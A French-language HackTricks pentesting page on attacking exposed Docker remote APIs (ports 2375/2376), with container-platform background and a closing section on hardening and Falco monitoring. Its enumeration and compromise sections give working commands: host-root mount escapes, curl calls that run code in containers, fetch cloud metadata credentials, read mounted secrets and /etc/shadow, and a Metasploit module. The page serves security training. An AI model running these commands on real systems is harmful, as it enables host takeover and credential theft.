# 2375, 2376 Pentesting Docker

{{#include ../banners/hacktricks-training.md}}

### Docker Basics

#### Qu'est-ce que c'est

Docker est la **plateforme de pointe** dans l'**industrie de la conteneurisation**, à la tête de **l'innovation continue**. Il facilite la création et la distribution sans effort d'applications, allant de **traditionnelles à futuristes**, et assure leur **déploiement sécurisé** à travers divers environnements.

#### Architecture de base de Docker

- [**containerd**](http://containerd.io) : C'est un **runtime central** pour les conteneurs, chargé de la **gestion complète du cycle de vie d'un conteneur**. Cela implique la gestion du **transfert et du stockage d'images**, en plus de superviser l'**exécution, la surveillance et le réseau** des conteneurs. **Des informations plus détaillées** sur containerd sont **explorées plus en profondeur**.
- Le **container-shim** joue un rôle critique en tant qu'**intermédiaire** dans la gestion des **conteneurs sans tête**, prenant en charge sans effort **runc** après l'initialisation des conteneurs.
- [**runc**](http://runc.io) : Réputé pour ses capacités de **runtime de conteneur léger et universel**, runc est aligné avec la **norme OCI**. Il est utilisé par containerd pour **démarrer et gérer des conteneurs** selon les **directives OCI**, ayant évolué à partir de l'original **libcontainer**.
- [**grpc**](http://www.grpc.io) est essentiel pour **faciliter la communication** entre containerd et le **docker-engine**, assurant une **interaction efficace**.
- Le [**OCI**](https://www.opencontainers.org) est essentiel pour maintenir les **spécifications OCI** pour les runtimes et les images, les dernières versions de Docker étant **conformes aux normes d'image et de runtime OCI**.

#### Commandes de base
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd** a été spécifiquement développé pour répondre aux besoins des plateformes de conteneurs comme **Docker et Kubernetes**, entre autres. Il vise à **simplifier l'exécution des conteneurs** sur divers systèmes d'exploitation, y compris Linux, Windows, Solaris, et plus encore, en abstraisant les fonctionnalités spécifiques au système d'exploitation et les appels système. L'objectif de Containerd est d'inclure uniquement les fonctionnalités essentielles requises par ses utilisateurs, s'efforçant d'omettre les composants inutiles. Cependant, atteindre cet objectif complètement est reconnu comme un défi.

Une décision de conception clé est que **Containerd ne gère pas le réseau**. Le réseau est considéré comme un élément critique dans les systèmes distribués, avec des complexités telles que le Software Defined Networking (SDN) et la découverte de services qui varient considérablement d'une plateforme à l'autre. Par conséquent, Containerd laisse les aspects réseau à gérer par les plateformes qu'il prend en charge.

Bien que **Docker utilise Containerd** pour exécuter des conteneurs, il est important de noter que Containerd ne prend en charge qu'un sous-ensemble des fonctionnalités de Docker. Plus précisément, Containerd manque des capacités de gestion du réseau présentes dans Docker et ne prend pas en charge la création de grappes Docker directement. Cette distinction met en évidence le rôle ciblé de Containerd en tant qu'environnement d'exécution de conteneurs, déléguant des fonctionnalités plus spécialisées aux plateformes avec lesquelles il s'intègre.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman** est un moteur de conteneurs open-source qui respecte les [normes de l'Open Container Initiative (OCI)](https://github.com/opencontainers), développé et maintenu par Red Hat. Il se distingue de Docker par plusieurs caractéristiques distinctes, notamment son **architecture sans démon** et le support des **conteneurs sans privilèges root**, permettant aux utilisateurs d'exécuter des conteneurs sans privilèges root.

Podman est conçu pour être compatible avec l'API de Docker, permettant l'utilisation des commandes CLI de Docker. Cette compatibilité s'étend à son écosystème, qui comprend des outils comme **Buildah** pour la création d'images de conteneurs et **Skopeo** pour des opérations sur les images telles que push, pull et inspect. Plus de détails sur ces outils peuvent être trouvés sur leur [page GitHub](https://github.com/containers/buildah/tree/master/docs/containertools).

**Différences Clés**

- **Architecture** : Contrairement au modèle client-serveur de Docker avec un démon en arrière-plan, Podman fonctionne sans démon. Ce design signifie que les conteneurs s'exécutent avec les privilèges de l'utilisateur qui les démarre, améliorant la sécurité en éliminant le besoin d'accès root.
- **Intégration avec Systemd** : Podman s'intègre avec **systemd** pour gérer les conteneurs, permettant la gestion des conteneurs via des unités systemd. Cela contraste avec l'utilisation de systemd par Docker principalement pour gérer le processus du démon Docker.
- **Conteneurs sans Privilèges Root** : Une caractéristique essentielle de Podman est sa capacité à exécuter des conteneurs sous les privilèges de l'utilisateur initiateur. Cette approche minimise les risques associés aux violations de conteneurs en garantissant que les attaquants n'obtiennent que les privilèges de l'utilisateur compromis, et non l'accès root.

L'approche de Podman offre une alternative sécurisée et flexible à Docker, mettant l'accent sur la gestion des privilèges des utilisateurs et la compatibilité avec les flux de travail Docker existants.

> [!NOTE]
> Notez qu'étant donné que podman vise à supporter la même API que docker, vous pouvez utiliser les mêmes commandes avec podman qu'avec docker telles que :
>
> ```bash
> podman --version
> podman info
> pdoman images ls
> podman ls
> ```

### Informations de Base

L'API distante fonctionne par défaut sur le port 2375 lorsqu'elle est activée. Le service, par défaut, ne nécessitera pas d'authentification, permettant à un attaquant de démarrer un conteneur docker privilégié. En utilisant l'API distante, on peut attacher des hôtes / (répertoire racine) au conteneur et lire/écrire des fichiers de l'environnement de l'hôte.

**Port par défaut :** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### Énumération

#### Manuel

Notez qu'afin d'énumérer l'API docker, vous pouvez utiliser la commande `docker` ou `curl` comme dans l'exemple suivant :
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
Si vous pouvez **contacter l'API docker distante avec la commande `docker`**, vous pouvez **exécuter** n'importe quelle des **commandes docker** [**précédemment** commentées](2375-pentesting-docker.md#basic-commands) pour interagir avec le service.

> [!NOTE]
> Vous pouvez `export DOCKER_HOST="tcp://localhost:2375"` et **éviter** d'utiliser le paramètre `-H` avec la commande docker

**Escalade de privilèges rapide**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

Parfois, vous verrez **2376** actif pour le point de terminaison **TLS**. Je n'ai pas pu m'y connecter avec le client docker, mais il est possible de le faire avec curl.
```bash
#List containers
curl –insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl –insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s –insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, it’s also worth checking out services in case they are adding secrets via environment variables)
curl -s –insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
Si vous souhaitez plus d'informations à ce sujet, des informations supplémentaires sont disponibles à l'endroit d'où j'ai copié les commandes : [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### Automatique
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Compromission

Dans la page suivante, vous pouvez trouver des moyens de **s'échapper d'un conteneur docker** :

{{#ref}}
../linux-hardening/privilege-escalation/docker-security/
{{#endref}}

En abusant de cela, il est possible de s'échapper d'un conteneur, vous pourriez exécuter un conteneur faible sur la machine distante, vous échapper de celui-ci et compromettre la machine :
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### Escalade de privilèges

Si vous êtes à l'intérieur d'un hôte utilisant docker, vous pouvez [**lire ces informations pour essayer d'élever les privilèges**](../linux-hardening/privilege-escalation/#writable-docker-socket).

### Découverte de secrets dans les conteneurs Docker en cours d'exécution
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
Vérifiez **env** (section des variables d'environnement) pour des secrets et vous pourriez trouver :

- Mots de passe.
- Adresses IP.
- Ports.
- Chemins.
- Autres… .

Si vous voulez extraire un fichier :
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### Sécuriser votre Docker

#### Sécuriser l'installation et l'utilisation de Docker

- Vous pouvez utiliser l'outil [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) pour inspecter votre installation actuelle de docker.
- `./docker-bench-security.sh`
- Vous pouvez utiliser l'outil [https://github.com/kost/dockscan](https://github.com/kost/dockscan) pour inspecter votre installation actuelle de docker.
- `dockscan -v unix:///var/run/docker.sock`
- Vous pouvez utiliser l'outil [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) pour vérifier les privilèges qu'un conteneur aura lorsqu'il est exécuté avec différentes options de sécurité. Cela est utile pour connaître les implications de l'utilisation de certaines options de sécurité pour exécuter un conteneur :
- `docker run --rm -it r.j3ss.co/amicontained`
- `docker run --rm -it --pid host r.j3ss.co/amicontained`
- `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Sécuriser les images Docker

- Vous pouvez utiliser une image docker de [https://github.com/quay/clair](https://github.com/quay/clair) pour faire scanner vos autres images docker et trouver des vulnérabilités.
- `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
- `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Sécuriser les Dockerfiles

- Vous pouvez utiliser l'outil [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) pour **inspecter votre Dockerfile** et trouver toutes sortes de mauvaises configurations. Chaque mauvaise configuration se verra attribuer un ID, vous pouvez trouver ici [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) comment corriger chacune d'elles.
- `dockerfilelinter -f Dockerfile`

![](<../images/image (176).png>)

- Vous pouvez utiliser l'outil [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) pour **inspecter votre Dockerfile** et trouver toutes sortes de mauvaises configurations.
- `dockerfilelint Dockerfile`

![](<../images/image (212).png>)

- Vous pouvez utiliser l'outil [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) pour **inspecter votre Dockerfile** et trouver toutes sortes de mauvaises configurations.
- `dockerlint Dockerfile`

![](<../images/image (71).png>)

- Vous pouvez utiliser l'outil [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) pour **inspecter votre Dockerfile** et trouver toutes sortes de mauvaises configurations.
- `hadolint Dockerfile`

![](<../images/image (501).png>)

#### Journaliser les activités suspectes

- Vous pouvez utiliser l'outil [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) pour détecter **un comportement suspect dans les conteneurs en cours d'exécution**.
- Notez dans le segment suivant comment **Falco compile un module noyau et l'insère**. Après cela, il charge les règles et **commence à journaliser les activités suspectes**. Dans ce cas, il a détecté 2 conteneurs privilégiés démarrés, 1 d'entre eux avec un montage sensible, et après quelques secondes, il a détecté comment un shell a été ouvert à l'intérieur de l'un des conteneurs.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Surveillance de Docker

Vous pouvez utiliser auditd pour surveiller docker.

### Références

- [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
- [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)

{{#include ../banners/hacktricks-training.md}}
